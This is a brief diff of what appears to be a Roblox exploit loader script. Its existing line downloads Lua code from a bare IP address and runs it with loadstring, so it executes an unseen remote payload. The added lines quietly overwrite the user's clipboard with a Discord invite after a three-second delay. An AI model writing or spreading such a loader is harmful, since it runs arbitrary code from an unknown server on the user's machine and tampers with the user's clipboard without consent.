@@ -1,2 +1,6 @@
+task.spawn(function()
+    task.wait(3)
+    setclipboard("https://discord.gg/CsnAtmkY5w")
+end)
 ID="004ad86d-1f4c-46be-bed5-f1952f01e1ca";
 loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
